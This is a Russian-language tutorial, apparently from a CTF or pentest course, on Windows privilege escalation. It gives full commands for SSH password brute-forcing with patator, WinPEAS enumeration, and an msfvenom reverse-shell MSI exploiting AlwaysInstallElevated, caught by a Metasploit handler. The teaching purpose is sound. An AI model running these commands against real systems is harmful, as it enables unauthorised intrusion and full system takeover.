### Основные понятия

**Горизонтальное перемещение** (lateral movement) — один из этапов атаки на организацию, во время которого
злоумышленник,
уже сумевший проникнуть внутрь корпоративной инфраструктуры и закрепиться в ней, начинает продвигаться по сети от точки
входа (например, скомпрометированного устройства или аккаунта) к другим объектам.

**Домен** – это основная административная единица в сетевой инфраструктуре предприятия, в которую входят все сетевые
объекты, такие как пользователи, компьютеры, принтеры, общие ресурсы и т.д. Совокупность (иерархия) доменов называется
лесом. У каждой компании может быть внешний и внутренний домен.

**Контроллер домена (domain controller)** — сервер, управляющий доступом к сетевым ресурсам в рамках одного домена (
группы
сетей или хостов, объединенных общими политиками безопасности). Контроллер домена осуществляет аутентификацию
пользователя в домене, то есть позволяет ему входить в сеть с помощью одной и той же пары логин-пароль с любого
включенного в домен компьютера, на котором это не запрещено политиками безопасности или локальными настройками.

### Разбор базового примера

Вы получили доступ к машине с ОС Windows, и ваша задача — поднять свои привилегии до максимальных и собрать данные для
последующего их использования на других машинах.

Ход действий

1. Просканируем Windows-систему на открытые порты с помощью nmap:

$ nmap -Pn -n -F -sV --open 10.8.0.14

2. Для получения первичного доступа предпримем попытку перебора паролей ssh с помощью утилиты patator.

Patator – это инструмент, позволяющий установить соединение с сервером и перебирать пароли, используя словари паролей
или списки паролей, которые можно настроить для каждого протокола. Patator также позволяет настроить параметры задержки
между попытками аутентификации, что позволяет снизить вероятность блокировки учетных записей.

$ patator ssh_login

Настроим patator на перебор SSH-паролей для пользователя john, при этом отфильтруем все сообщения, включающие в себя
строку “Authentication failed” чтобы видеть только успешные попытки входа.

$ patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:
mesg='Authentication failed.'

Путем перебора получаем верный пароль: loveme1

3. Подключимся к Windows-машине по ssh:

$ ssh john@10.8.0.14

john@WIN10> whoami

john@WIN10> dir

4. Для автоматического поиска вектора для повышения привилегий используем утилиту WinPEAS:

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

WinPEAS может автоматически определять наличие открытых портов, установленные программы и службы, запланированные
задачи, наличие уязвимых файловых разрешений, настройки UAC (User Account Control) и другие уязвимости привилегий в
операционной системе.

Использование WinPEAS может значительно упростить процесс поиска уязвимостей привилегий и повысить эффективность и
скорость анализа безопасности системы.

Скачаем актуальную версию WinPEAS под 64-разрядные ОС на локальную машину:

$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20230413-7f846812/winPEASx64.exe

5. Передадим файл на удаленную машину по SSH с помощью scp и запустим файл:

$ scp winPEASx64.exe john@10.8.0.14:C:\\Users\\John\\

john@WIN10> winPEASx64.exe

6. Рассмотрим вывод утилиты: наибольшее внимание стоит обращать на выделенное красным. Последовательно просматривая
   возможные вектора, обратим внимание на AlwaysInstallElevated:

Это политика, позволяющая устанавливать любые msi-пакеты с повышенными правами. Это значит, что, если мы сгенерируем
полезную нагрузку в этом формате, то при её запуске она будет работать от имени NT AUTHORITY\SYSTEM, что дает нам полные
привилегии на этой машине.

7. Сгенерируем полезную нагрузку в формате msi с помощью msfvenom, полезной нагрузкой будет обратное shell-соединение на
   нашу машину:

$ msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.28 LPORT=4444 -f msi -o tmp/rev.msi

8. Отправим полезную нагрузку на удаленную машину с помощью SCP:

$ scp tmp/rev.msi john@10.8.0.14:C:\\Users\\John\\

9. Подготовим хэндлер для получения shell-соединения с помощью msf:

$ msfconsole

10. Используем метаэксплойт exploit/multi/handler, необходимый для принятия соединений от полезных нагрузок в случае,
    если их запуск идет независимо от применения RCE-эксплойтов самого msf. Укажем выбранный payload и адрес, на котором
    он будет ожидать подключения:

msf6> use exploit/multi/handler

msf6> options

msf6> set PAYLOAD windows/x64/shell_reverse_tcp

msf6> set LHOST 10.8.0.28

11. Проверим, что удаленная система доступна по RDP:

$ nmap -Pn -n -p 3389 -sV --open 10.8.0.14

12. Подключимся к удаленной системе по RDP, используя xfreerdp – свободный RDP-клиент с консольным интерфейсом, укажем
    пользователя, пароль, хост и удобную нам ширину экрана:

$ xfreerdp /u:john /p:loveme1 /w:768 /v:10.8.0.14

13. Запускаем инсталлятор:


14. После получения соединения в msf выполним базовую разведку и убедимся, что обладаем максимальными правами, после
    чего прочтем флаг:

> whoami

> cd C:\Users\michael\Desktop

> type root.txt
>

### Общие принципы

В рамках основных принципов повышения привилегий мы рассмотрим 2 этапа:

- Повышение привилегий на отдельной машине Windows
- Горизонтальное перемещение в сети с Windows машинами 

#### Основные категории методов повышения привилегий

- Использование физического доступа: например, когда вы получаете прямой доступ на уровне диска и изменяете пароль в
файловой системе
- Извлечение секретов и учетных данных: с получением различных прав доступа в Windows становится возможным извлекать
секреты и учетные данные из различных хранилищ
- Эксплуатация уязвимостей конфигурации ОС Windows: невероятно большое количество служб и сервисов в Windows должны быть
корректно настроенными или отключенными, чтобы не дать доступа злоумышленнику воспользоваться недостаткам настройки
- Эксплуатация известных уязвимостей ОС Windows: ежегодно в Windows обнаруживают и устраняют десятки и сотни уязвимостей,
благодаря которым эксплуатация становится возможной, если система не обновлена до последней версии
- Даже при категоризации уязвимостей и недостатков, приводящих к возможности повышения привилегий в WIndows, количество
методов внутри этих категорий невероятно большое. Назвать все эти методы будет сложно, поэтому мы рассмотрим только
наиболее яркие из них, чтобы дать понять, какие ситуации могут возникать в каждой из категорий.